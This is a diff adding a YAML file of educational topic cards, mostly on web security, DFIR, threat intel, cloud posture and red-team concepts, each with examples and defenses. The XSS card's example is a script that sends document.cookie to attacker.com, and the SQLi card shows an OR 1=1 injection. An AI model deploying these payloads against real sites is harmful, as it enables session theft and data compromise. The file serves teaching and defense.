@@ -1,0 +1,411 @@
+scanner:
+  - id: 'xss'
+    title: 'Cross-Site Scripting (XSS)'
+    description: 'XSS allows attackers to inject malicious scripts into webpages viewed by other users.'
+    details: 'This occurs when an application includes untrusted data in a web page without proper validation or escaping. The attacker''s script can hijack user sessions, deface websites, or redirect the user to malicious sites.'
+    real_use_case: 'Stealing session cookies to hijack user accounts on a banking or social media site.'
+    example: '<script>fetch("http://attacker.com/steal?cookie=" + document.cookie)</script>'
+    conceptual_diagram: |
+      [User] -> (Requests Page) -> [Server]
+        ^                               |
+        | (Malicious Script execution)  | (Infects Response)
+        +-------------------------------+
+    defenses:
+      - 'Context-aware output encoding (escaping).'
+      - 'Using Content Security Policy (CSP).'
+      - 'Sanitizing HTML input using a library like DOMPurify.'
+    glossary:
+      - term: 'Payload'
+        definition: 'The actual malicious code executed.'
+  - id: 'sqli'
+    title: 'SQL Injection (SQLi)'
+    description: 'SQL Injection occurs when untrusted user input is concatenated directly into a database query.'
+    details: 'Attackers can manipulate the input to alter the structure of the SQL query. This can lead to unauthorized data access, modification, or deletion.'
+    real_use_case: 'Bypassing an authentication screen or dumping a database of user credit cards.'
+    example: "SELECT * FROM users WHERE username = 'admin' AND password = 'password' OR 1=1 --'"
+    conceptual_diagram: |
+      [Input Field: ' OR 1=1 -- ] 
+             |
+             v
+      [Web App Builder] -> SELECT * FROM users WHERE username='' OR 1=1
+             |
+             v
+      [Database] (Returns all rows)
+    defenses:
+      - 'Use Prepared Statements (Parameterized Queries).'
+      - 'Use Stored Procedures.'
+      - 'Enforce strict input validation.'
+    glossary:
+      - term: 'Prepared Statement'
+        definition: 'A feature to execute the same SQL statements repeatedly with high efficiency and security against SQL injection.'
+  - id: 'analyze_source_context'
+    title: 'Analyze Source Context'
+    description: 'Understanding where untrusted input originates and how it flows through the application.'
+    details: 'By tracing the flow of data from input sources (like HTTP parameters, headers, or databases) to execution sinks (like DOM insertion or SQL queries), we can identify points where validation or encoding is missing.'
+    real_use_case: 'Reviewing a pull request to ensure that a newly added URL parameter is properly sanitized before being reflected in the HTML.'
+    example: 'const userInput = new URLSearchParams(window.location.search).get("query"); // Source\ndocument.getElementById("results").innerHTML = userInput; // Sink (Vulnerable)'
+    conceptual_diagram: |
+      [Input Source (URL/Form)]
+                |
+                v
+       [Data Flow Trace] ---> Check for Sanitization
+                |
+                v
+        [Execution Sink (DOM/SQL)]
+    defenses:
+      - 'Identify all entry points for untrusted data.'
+      - 'Map data flow to sensitive sinks.'
+      - 'Implement strict input validation.'
+  - id: 'context_aware_encoding'
+    title: 'Implement Context-Aware Encoding'
+    description: 'Applying the correct encoding method based on where data is inserted.'
+    details: 'Data must be encoded differently depending on whether it is placed in an HTML body, an HTML attribute, JavaScript code, or a URL. Context-aware encoding ensures that special characters are neutralized for that specific context.'
+    real_use_case: 'Rendering user-supplied text inside a JavaScript string block within a script tag safely.'
+    example: 'HTML: &lt;script&gt;var name = "&lt;%= encodeForJS(user.name) %&gt;";&lt;/script&gt;'
+    conceptual_diagram: |
+      [Untrusted Data] -> "John O'Connor"
+            |
+            v
+      [Context Engine]
+         /      \       \
+       HTML    JS      URL
+       /          \       \
+      John O&#x27;Connor  John O''Connor
+    defenses:
+      - 'Use templating engines with automatic context-aware encoding.'
+      - 'Manually encode data based on its destination context.'
+  - id: 'apply_csp'
+    title: 'Apply Content Security Policy (CSP)'
+    description: 'A defense-in-depth mechanism to restrict the resources a browser is allowed to load.'
+    details: 'CSP helps mitigate XSS and data injection attacks by defining which dynamic resources are permitted to load and execute. It allows site administrators to declare approved sources of content.'
+    real_use_case: 'Preventing inline scripts from executing on a web page to neutralize stored XSS attacks.'
+    example: 'Content-Security-Policy: default-src ''self''; script-src ''self'' https://trusted.cdn.com;'
+    conceptual_diagram: |
+      [Web Page loaded with CSP Header]
+                   |
+                   v
+       [Browser attempts to load script]
+          /                 \
+      (Trusted CDN)      (Inline Script)
+         /                   \
+       Allowed             Blocked (CSP Violation)
+    defenses:
+      - 'Disable inline scripts (remove ''unsafe-inline'').'
+      - 'Restrict domains allowed to load scripts or styles.'
+      - 'Monitor CSP violation reports.'
+ecommerce:
+  - id: 'conversion'
+    title: 'Conversion Rate Optimization'
+    description: 'The systematic process of increasing the percentage of website visitors who take a desired action.'
+    details: 'CRO involves understanding how users navigate through your site, what actions they take, and what''s stopping them from completing your goals.'
+    real_use_case: 'Changing a checkout button from gray to bright green to increase purchases.'
+    example: 'Using a split A/B test to route 50% of traffic to a one-page checkout vs a multi-step checkout.'
+    conceptual_diagram: |
+      [Traffic (100%)]
+         /      \
+      (A: 50%)  (B: 50%)
+        |         |
+      [1% Conv] [3% Conv] -> Winner!
+    defenses:
+      - 'A/B Testing different checkout flows.'
+      - 'Reducing form fields and friction.'
+      - 'Clear call-to-action placement.'
+    glossary:
+      - term: 'A/B Testing'
+        definition: 'Comparing two versions of a webpage to see which performs better.'
+  - id: 'pricing'
+    title: 'Dynamic Pricing'
+    description: 'Pricing strategy in which businesses set flexible prices for products or services based on current market demands.'
+    details: 'Agents can monitor competitor prices, inventory levels, and demand signals to adjust prices in real-time to maximize revenue or clear stock.'
+    real_use_case: 'An airline increasing ticket prices as the departure date approaches and seats fill up.'
+    example: 'If (competitor_stock == 0) -> Increase Price by 15%'
+    conceptual_diagram: |
+      [Market Data] -> (Demand Spike) -> [Pricing Engine]
+                                                |
+                                                v
+                                        [Price +20%]
+    defenses:
+      - 'Set hard floor and ceiling price limits.'
+      - 'Monitor for race conditions leading to price crashes.'
+    glossary:
+      - term: 'Race Condition'
+        definition: 'When two automated systems get caught in a loop of undercutting each other.'
+devtools:
+  - id: 'cyclomatic'
+    title: 'Cyclomatic Complexity'
+    description: 'A software metric used to indicate the complexity of a program.'
+    details: 'It is a quantitative measure of the number of linearly independent paths through a program''s source code. High complexity indicates code that is hard to test and maintain.'
+    real_use_case: 'Identifying code blocks that are too complex and likely to contain bugs during a PR review.'
+    example: 'A function with 10 nested if-else statements has high cyclomatic complexity.'
+    conceptual_diagram: |
+      Start
+        |
+       [If A]--No-->[If B]--No--> End
+        |            |
+       Yes          Yes
+        |            |
+      End          End
+    defenses:
+      - 'Refactoring large functions into smaller, single-purpose functions.'
+      - 'Using early returns to reduce nesting.'
+    glossary:
+      - term: 'Control Flow Graph'
+        definition: 'A representation of all paths that might be traversed through a program during its execution.'
+  - id: 'secrets'
+    title: 'Hardcoded Secrets'
+    description: 'Sensitive information like API keys or passwords embedded directly in source code.'
+    details: 'When secrets are committed to version control, they can be easily discovered by attackers. Automated review agents scan diffs for entropy patterns and known secret formats.'
+    real_use_case: 'An attacker finding an AWS key in a public GitHub repo and mining cryptocurrency.'
+    example: 'const AWS_KEY = "AKIAIOSFODNN7EXAMPLE";'
+    conceptual_diagram: |
+      [Developer] -> (Commits Code + API Key) -> [GitHub]
+                                                    |
+                                                    v
+                                                [Attacker Bot]
+    defenses:
+      - 'Use environment variables.'
+      - 'Implement secret scanning in CI/CD.'
+    glossary:
+      - term: 'Entropy'
+        definition: 'A measure of randomness used to detect high-entropy strings like API keys.'
+dfir:
+  - id: 'memory_forensics'
+    title: 'Memory Forensics'
+    description: 'The analysis of a computer''s volatile memory dump (RAM).'
+    details: 'Its primary purpose is to uncover artifacts of malicious activity that exist solely in memory and do not write to the hard drive, such as fileless malware, hidden rootkits, and extracted encryption keys.'
+    real_use_case: 'Identifying injected code (Process Hollowing) inside a legitimate svchost.exe process.'
+    example: 'volatility -f memdump.raw --profile=Win10x64_18362 pslist'
+    conceptual_diagram: |
+      [Compromised Endpoint]
+              | (Memory Capture Tool)
+              v
+       [RAM Dump (.raw)]
+              |
+              v
+       [Analysis Engine] -> Extracts: Network Conns, Injected Code, Passwords
+    defenses:
+      - 'Deploy EDR tools capable of continuous memory scanning.'
+      - 'Restrict debug privileges to prevent unauthorized memory dumping.'
+    glossary:
+      - term: 'Fileless Malware'
+        definition: 'Malware that operates entirely in memory, avoiding traditional antivirus file scans.'
+  - id: 'network_beaconing'
+    title: 'C2 Beaconing Analysis'
+    description: 'Detecting automated, regular communications from an infected host to a Command & Control server.'
+    details: 'Attackers use beaconing to maintain persistence and receive instructions. DFIR agents analyze PCAPs or flow logs to identify regular intervals (jitter) of outbound traffic to suspicious IPs or domains.'
+    real_use_case: 'Spotting a compromised workstation reaching out to an external IP on port 443 every 5 minutes.'
+    example: 'Source: 192.168.1.15 -> Dest: 203.0.113.10 | Frequency: ~300s | Payload: 54 bytes'
+    conceptual_diagram: |
+      [Infected Host] --- (5 min) ---> [C2 Server]
+      [Infected Host] --- (5 min) ---> [C2 Server]
+      [Infected Host] --- (5 min) ---> [C2 Server]
+    defenses:
+      - 'Egress filtering and strict firewall rules.'
+      - 'Implement DNS sinkholing for known malicious domains.'
+    glossary:
+      - term: 'Jitter'
+        definition: 'Randomization added to the beacon interval to avoid detection by predictable pattern matching.'
+  - id: 'containment_isolation'
+    title: 'Endpoint Containment'
+    description: 'The process of rapidly disconnecting a compromised host from the network.'
+    details: 'The goal is to stop the spread of an infection (like ransomware) or halt data exfiltration. The isolated host is typically only allowed to communicate with a secure forensic or EDR server.'
+    real_use_case: 'Automatically isolating a laptop the moment a ransomware encryption routine is detected.'
+    example: 'Invoke-NetworkIsolation -Hostname "Laptop-04" -AllowIP "10.0.0.50"'
+    conceptual_diagram: |
+      [Compromised Host] -x-> (Internal Network / AD)
+             |
+            (Allowed)
+             v
+      [Forensic Server]
+    defenses:
+      - 'Zero Trust Architecture.'
+      - 'Automated playbooks for instant isolation via Network Access Control (NAC).'
+threat_intel:
+  - id: 'osint_fundamentals'
+    title: 'OSINT Fundamentals'
+    description: 'Open-Source Intelligence gathering methodologies.'
+    details: 'OSINT involves collecting and analyzing data from publicly available sources (social media, public databases, forums) to produce actionable intelligence regarding potential threats.'
+    real_use_case: 'Discovering a database credential leaked accidentally on a public GitHub repository.'
+    example: 'Using tools like Maltego or Shodan to map an organization’s external footprint.'
+    conceptual_diagram: |
+      [Public Web] --> (Scrapers/APIs) --> [OSINT Engine]
+             |                                  |
+             v                                  v
+      [Social, GitHub, Pastebins]        [Correlated Threat Data]
+    defenses:
+      - 'Continuous monitoring of brand and executive exposure.'
+      - 'Enforcing strict repository scanning before code commits.'
+    glossary:
+      - term: 'Shodan'
+        definition: 'A search engine for internet-connected devices, often used in OSINT to find exposed servers.'
+  - id: 'mitre_attack'
+    title: 'MITRE ATT&CK Mapping'
+    description: 'Contextualizing threat data using the MITRE ATT&CK framework.'
+    details: 'A globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. Threat intel agents map unstructured threat data (like a blog post about a new hack) into structured TTPs (Tactics, Techniques, and Procedures).'
+    real_use_case: 'Translating a report about a new phishing campaign into specific MITRE techniques (e.g., T1566: Phishing) to check if current defenses cover it.'
+    example: 'Threat: "Malware uses WMI to move laterally." -> Map to: T1047 (WMI).'
+    conceptual_diagram: |
+      [Raw Threat Report]
+               |
+               v
+      [Contextualizer] -> Maps to:
+               |-- Tactic: Lateral Movement
+               |-- Technique: WMI (T1047)
+    defenses:
+      - 'Use ATT&CK to conduct gap analysis on SIEM rules.'
+      - 'Run adversary emulation exercises based on known threat actor profiles.'
+    glossary:
+      - term: 'TTPs'
+        definition: 'Tactics, Techniques, and Procedures - the behavior patterns of cyber adversaries.'
+  - id: 'cve_management'
+    title: 'CVE & Zero-Day Tracking'
+    description: 'Monitoring and prioritizing software vulnerabilities.'
+    details: 'Common Vulnerabilities and Exposures (CVE) tracking involves monitoring databases like NVD for newly discovered flaws. Threat Intelligence adds value by prioritizing these based on exploitability (is there a proof-of-concept?) and asset relevance.'
+    real_use_case: 'Prioritizing a critical zero-day in Apache Struts over a critical flaw in a software the organization doesn''t use.'
+    example: 'Alert: CVE-2021-44228 (Log4Shell) - Exploit Active. Asset: WebServer-01 uses vulnerable Log4j.'
+    conceptual_diagram: |
+      [NVD / Vendor Advisories] --> [Threat Intel Engine] <-- [Internal Asset Inventory]
+                                            |
+                                            v
+                                 [Prioritized Alert (High Severity)]
+    defenses:
+      - 'Automated asset inventory and software bill of materials (SBOM).'
+      - 'Risk-based vulnerability management rather than simply patching by CVSS score.'
+    glossary:
+      - term: 'Zero-Day'
+        definition: 'A software vulnerability unknown to the vendor, meaning no patch exists yet.'
+cloud_posture:
+  - id: 'cspm_fundamentals'
+    title: 'CSPM Fundamentals'
+    description: 'Cloud Security Posture Management.'
+    details: 'CSPM tools continuously monitor cloud environments (AWS, GCP, Azure) to identify misconfigurations, enforce compliance, and detect drift from security baselines.'
+    real_use_case: 'Detecting an S3 bucket that was accidentally made public during a deployment and automatically making it private again.'
+    example: 'Scanning an AWS account against the CIS AWS Foundations Benchmark.'
+    conceptual_diagram: |
+      [Cloud Environment (AWS/GCP)] 
+                | (API Polling)
+                v
+          [CSPM Engine] -> Checks against [CIS/HIPAA Benchmarks]
+                |
+                v
+         [Misconfiguration Alert] -> [Auto-Remediation (Lambda)]
+    defenses:
+      - 'Enforce Infrastructure as Code (IaC) to prevent manual console changes.'
+      - 'Implement strict Service Control Policies (SCPs) to limit region and service usage.'
+    glossary:
+      - term: 'CSPM'
+        definition: 'Cloud Security Posture Management.'
+  - id: 'iac_drift'
+    title: 'IaC Drift Detection'
+    description: 'Monitoring deviations from Infrastructure as Code state.'
+    details: 'When infrastructure is provisioned via code (like Terraform), any manual changes made via the Cloud Console cause "drift." Drift detection identifies these out-of-band changes so they can be reverted or codified.'
+    real_use_case: 'An engineer manually opens port 22 in a security group via the AWS console for troubleshooting and forgets to close it.'
+    example: 'Terraform plan shows differences between local state and remote cloud resources.'
+    conceptual_diagram: |
+      [Terraform Code] ==(Matches)==> [Terraform State]
+                                            |
+                                       (Drift Check)
+                                            |
+                                            v
+                                   [Actual Cloud Resource]
+    defenses:
+      - 'Remove write access to the cloud console for developers.'
+      - 'Run drift detection checks continuously in CI/CD pipelines.'
+    glossary:
+      - term: 'Drift'
+        definition: 'The deviation of actual cloud infrastructure from its declared Infrastructure as Code state.'
+  - id: 'iam_least_privilege'
+    title: 'Cloud IAM & Least Privilege'
+    description: 'Managing access controls in cloud environments.'
+    details: 'Cloud Identity and Access Management (IAM) requires enforcing the principle of least privilege. Misconfigured IAM roles are a primary vector for cloud breaches.'
+    real_use_case: 'Identifying an EC2 instance profile that has AdministratorAccess when it only needs read access to a specific S3 bucket.'
+    example: 'Using tools like AWS IAM Access Analyzer to detect unused permissions.'
+    conceptual_diagram: |
+      [User / Role] 
+           | (Requests Access)
+           v
+      [IAM Policy] -> (Evaluates Allow/Deny)
+           |
+           v
+      [Cloud Resource (S3, EC2)]
+    defenses:
+      - 'Use permission boundaries to limit the maximum permissions a role can have.'
+      - 'Regularly audit and remove unused IAM credentials and roles.'
+    glossary:
+      - term: 'Least Privilege'
+        definition: 'Providing only the minimum permissions necessary for an identity to perform its required tasks.'
+
+sast:
+  - id: 'sast_intro'
+    title: 'Static Application Security Testing (SAST)'
+    description: 'SAST analyzes source code to find security vulnerabilities before the code is compiled or deployed.'
+    details: 'SAST tools examine source code at rest to discover coding errors and security flaws. It helps shift security left by providing early feedback directly within the CI/CD pipeline.'
+    real_use_case: 'Scanning a pull request to detect SQL injections or buffer overflows.'
+    defenses:
+      - 'Integrate SAST into CI/CD pipelines.'
+      - 'Provide actionable remediation snippets.'
+  - id: 'secret_scanning'
+    title: 'Secret Scanning'
+    description: 'Detects hardcoded secrets, API keys, and passwords before they are merged.'
+    details: 'Developers sometimes accidentally commit API keys or passwords. Secret scanning identifies these patterns using regular expressions or entropy analysis.'
+    real_use_case: 'Blocking a PR that contains an AWS Secret Access Key.'
+    defenses:
+      - 'Use secret management systems (e.g., HashiCorp Vault).'
+      - 'Implement pre-commit hooks to prevent secret commits.'
+  - id: 'dependency_analysis'
+    title: 'Dependency Analysis (SCA)'
+    description: 'Identifies vulnerable third-party dependencies and libraries.'
+    details: 'Modern applications rely heavily on open-source libraries. Software Composition Analysis (SCA) tools track components and their versions, comparing them against known vulnerability databases (e.g., CVEs).'
+    real_use_case: 'Flagging an outdated version of Log4j that is vulnerable to remote code execution.'
+    defenses:
+      - 'Automate dependency updates (e.g., Dependabot).'
+      - 'Maintain a Software Bill of Materials (SBOM).'
+red_team:
+  - id: 'lateral_movement'
+    title: 'Lateral Movement'
+    description: 'Techniques adversaries use to enter and control remote systems on a network.'
+    details: 'After gaining initial access, attackers often need to pivot to other systems to reach their objective. This involves gathering credentials, exploiting misconfigurations, or using built-in administrative tools like PsExec or WMI.'
+    real_use_case: 'Using a compromised low-privilege workstation account to dump memory credentials and authenticate to a database server.'
+    example: 'Pass-the-Hash (PtH) attack using Mimikatz and PsExec.'
+    conceptual_diagram: |
+      [Workstation A] --(Credential Theft)--> [Server B]
+          (Initial Foothold)                  (Objective)
+    defenses:
+      - 'Network Segmentation and Microsegmentation.'
+      - 'Disable unnecessary administrative shares.'
+      - 'Implement Just-in-Time (JIT) access.'
+    glossary:
+      - term: 'Pivot'
+      - definition: 'Using a compromised system to attack other systems on the same network.'
+  - id: 'privilege_escalation'
+    title: 'Privilege Escalation'
+    description: 'Exploiting a bug, design flaw, or configuration oversight to gain elevated access.'
+    details: 'Adversaries often land on a system with standard user privileges. Privilege escalation techniques (like exploiting unquoted service paths or kernel vulnerabilities) are used to gain SYSTEM or root access.'
+    real_use_case: 'Exploiting a vulnerable third-party driver to execute code as SYSTEM.'
+    example: 'Exploiting CVE-2021-36934 (SeriousSAM) to read the SAM file.'
+    conceptual_diagram: |
+      [Standard User]
+            |
+      (Exploit Vulnerable Service)
+            |
+            v
+      [SYSTEM / Root]
+    defenses:
+      - 'Implement Principle of Least Privilege.'
+      - 'Regularly patch OS and third-party software.'
+      - 'Audit file and folder permissions.'
+    glossary:
+      - term: 'SYSTEM'
+      - definition: 'The highest privilege level on a Windows operating system.'
+  - id: 'vulnerability_chaining'
+    title: 'Vulnerability Chaining'
+    description: 'Combining multiple low-severity vulnerabilities to achieve a high-impact compromise.'
+    details: 'A single bug might not be critical, but when an attacker chains an information disclosure bug with a cross-site scripting flaw, and then a misconfigured CORS policy, the combined effect can lead to total system takeover.'
+    real_use_case: 'Chaining an SSRF vulnerability with an exposed metadata API to steal cloud credentials.'
+    example: 'SSRF -> AWS Metadata IP -> IAM Token -> Cloud Account Compromise'
+    conceptual_diagram: |
+      [Low Sev Bug 1] -> [Low Sev Bug 2] -> [High Impact Compromise]
+    defenses:
+      - 'Fix all identified vulnerabilities, regardless of severity.'
+      - 'Implement defense-in-depth strategies.'
+      - 'Monitor for anomalous behavior patterns.'
